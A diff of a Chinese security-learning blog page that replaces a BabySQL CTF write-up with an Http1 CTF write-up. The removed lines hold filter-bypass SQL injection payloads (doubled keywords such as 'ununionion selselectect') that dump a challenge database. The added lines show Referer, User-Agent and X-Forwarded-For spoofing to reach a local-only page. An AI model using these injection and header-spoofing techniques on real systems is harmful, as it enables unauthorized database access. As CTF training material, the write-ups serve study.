@@ -4,7 +4,7 @@
 
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="BabySQL(极客大挑战), 风鸣">
+    <meta name="keywords" content="Http1(极客), 风鸣">
     <meta name="description" content="安全学习博客">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>BabySQL(极客大挑战) | 风鸣</title>
+    <title>Http1(极客) | 风鸣</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -248,12 +248,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BabySQL(极客大挑战)</h1>
+                    <h1 class="description center-align post-title">Http1(极客)</h1>
                 </div>
             </div>
         </div>
@@ -369,12 +369,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
-                                <span class="chip bg-color">极客大挑战</span>
+                            <a href="/tags/CTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+                                <span class="chip bg-color">-CTF -极客大挑战</span>
                             </a>
                         
                     </div>
@@ -398,7 +394,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-21
+                    2021-10-24
                 </div>
                 
 
@@ -419,53 +415,37 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="BabySQL-极客大挑战"><a href="#BabySQL-极客大挑战" class="headerlink" title="BabySQL (极客大挑战)"></a>BabySQL (极客大挑战)</h2><blockquote>
-<p>先在此做一个简单的题目的小博客，然后再出一个关于此系列的总篇章。</p>
-</blockquote>
-<h3 id="首先打开题目的网址"><a href="#首先打开题目的网址" class="headerlink" title="首先打开题目的网址"></a>首先打开题目的网址</h3><p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/2.png"></p>
-<h3 id="下面开始解题"><a href="#下面开始解题" class="headerlink" title="下面开始解题"></a>下面开始解题</h3><blockquote>
-<p>1、首先尝试万能密码(1’ or 1 = 1%23)进行做题，发现or被过滤了，然后将or进行双写oorr发现可以通过。</p>
-</blockquote>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/3.png"></p>
+                <h2 id="Http1-极客大挑战"><a href="#Http1-极客大挑战" class="headerlink" title="Http1(极客大挑战)"></a>Http1(极客大挑战)</h2><h3 id="1、打开题目"><a href="#1、打开题目" class="headerlink" title="1、打开题目"></a>1、打开题目</h3><p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/1.png"></p>
 <blockquote>
-<p>2、然后在进行select以及union进行测试,然后发现union以及select都被过滤，则将其进行双写，则通过。</p>
+<p>发现什么都没有，接着打开源码观察</p>
 </blockquote>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/4.png"></p>
+<p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/2.png"></p>
 <blockquote>
-<p>3、由上图看出语法没有出错，但是列数出错了，则增加列的数量。</p>
+<p>在其中发现了Secret.php</p>
 </blockquote>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/5.png"></p>
+<h3 id="2、打开Secret-php"><a href="#2、打开Secret-php" class="headerlink" title="2、打开Secret.php"></a>2、打开Secret.php</h3><p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/3.png"></p>
 <blockquote>
-<p>4、由此开始重复进行爆库，爆表，爆列(在其中发现了from也被过滤了)</p>
-<p>得到全部数据库名，发现可疑的数据库名 ctf</p>
+<p>要求我们从图片上的网址上进入</p>
+<p>及此考察的是请求头的知识，用Burp Suit进行抓包</p>
 </blockquote>
-<pre class=" language-mysql"><code class="language-mysql">/check.php?username=1&password=1' ununionion selselectect 1,2,group_concat(schema_name) frofromm (infoorrmation_schema.schemata)%23
+<h3 id="3、抓包"><a href="#3、抓包" class="headerlink" title="3、抓包"></a>3、抓包</h3><h3 id><a href="#" class="headerlink" title></a><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/4.png"></h3><h4 id="1、加入Referer"><a href="#1、加入Referer" class="headerlink" title="1、加入Referer"></a>1、加入Referer</h4><blockquote>
+<p>(Referer属于请求头当中的一部分，告诉从哪个链接过来的)</p>
+</blockquote>
+<p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/5.png"></p>
+<blockquote>
+<p>发现需要修改浏览器的类型为：Syclover(即修改User-Agent)</p>
+<p><em><strong>User-Agent是浏览器的身份标识字符串。User-Agent会告诉网站服务器，访问者是通过什么工具来请求的，如果是爬虫请求，一般会拒绝，如果是用户浏览器，就会应答</strong></em></p>
+</blockquote>
+<h4 id="2、修改User-Agent"><a href="#2、修改User-Agent" class="headerlink" title="2、修改User-Agent"></a>2、修改User-Agent</h4><p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/6.png"></p>
+<blockquote>
+<p>又发现其需要在本地进行访问，则需要加上：X-Forwarded-For</p>
+</blockquote>
+<h4 id="3、加上X-Forwarded-For"><a href="#3、加上X-Forwarded-For" class="headerlink" title="3、加上X-Forwarded-For"></a>3、加上X-Forwarded-For</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">X-Forwarded-For:</span> 127.0.0.1
 </code></pre>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/6.png"></p>
-<blockquote>
-<p>5、然后进行爆表</p>
-<p>(在其中发现where也被过滤)</p>
+<p><img src="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/7.png"></p>
+<h4 id="4、最终得到flag"><a href="#4、最终得到flag" class="headerlink" title="4、最终得到flag"></a>4、最终得到flag</h4><blockquote>
+<p>flag{9c86db35-aaae-4287-ae6b-af90dee26f85}</p>
 </blockquote>
-<pre class=" language-mysql"><code class="language-mysql">/check.php?username=1&password=1' ununionion selselectect 1,2,group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema="ctf"%23
-</code></pre>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/7.png"></p>
-<blockquote>
-<p>6、由上发现了表名 Flag</p>
-<p>开始爆字段(得到其flag)</p>
-</blockquote>
-<pre class=" language-mysql"><code class="language-mysql">/check.php?username=1&password=1' ununionion selselectect 1,2,group_concat(column_name) frofromm infoorrmation_schema.columns whewherere table_name="Flag"%23
-</code></pre>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/8.png"></p>
-<blockquote>
-<p>7、开始爆数据</p>
-</blockquote>
-<pre class=" language-mysql"><code class="language-mysql">/check.php?username=1&password=1' ununionion selselectect 1,2,group_concat(flag) frofromm (ctf.Flag)%23
-</code></pre>
-<p><img src="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/9.png"></p>
-<blockquote>
-<p>最终得到flag为：flag{d29ead46-8e37-49a0-a747-bdd50cedf916}。</p>
-</blockquote>
-<p>结束！！！</p>
 
                 
             </div>
@@ -492,7 +472,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://FengMMing.github.io/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/">https://FengMMing.github.io/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/</a>
+                    <a href="https://FengMMing.github.io/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/">https://FengMMing.github.io/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -530,12 +510,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
-                                    <span class="chip bg-color">极客大挑战</span>
+                                <a href="/tags/CTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+                                    <span class="chip bg-color">-CTF -极客大挑战</span>
                                 </a>
                             
                         </div>
@@ -958,9 +934,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/24/Http1-%E6%9E%81%E5%AE%A2/">
                     <div class="card-image">
@@ -978,9 +955,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -993,6 +970,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1011,13 +989,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/17/hello-world/">
+                <a href="/2021/10/21/BabySQL-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="BabySQL(极客大挑战)">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">BabySQL(极客大挑战)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1028,15 +1006,31 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-21
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            lijian
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+                        <span class="chip bg-color">极客大挑战</span>
+                    </a>
+                    
                 </div>
                 
             </div>
